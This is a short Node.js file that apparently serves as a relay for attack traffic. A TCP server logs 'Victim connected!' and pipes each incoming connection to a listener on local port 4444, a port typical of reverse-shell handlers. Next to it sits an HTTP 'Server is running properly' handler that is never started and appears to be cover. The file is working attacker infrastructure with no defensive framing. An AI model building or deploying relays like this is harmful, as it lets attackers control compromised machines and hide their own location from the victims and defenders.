const net = require('net');
const http = require('http');

const PORT = process.env.PORT || 10000;

const httpServer = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Server is running properly\n');
});

const tcpServer = net.createServer((socket) => {
    console.log('Victim connected!');
    const client = net.createConnection({ port: 4444, host: '127.0.0.1' });
    socket.pipe(client);
    client.pipe(socket);
    socket.on('error', (e) => console.log('Socket Error:', e.message));
    client.on('error', (e) => console.log('Client Error:', e.message));
});

tcpServer.listen(PORT, '0.0.0.0', () => {
    console.log(`Proxy server live on port ${PORT}`);
});
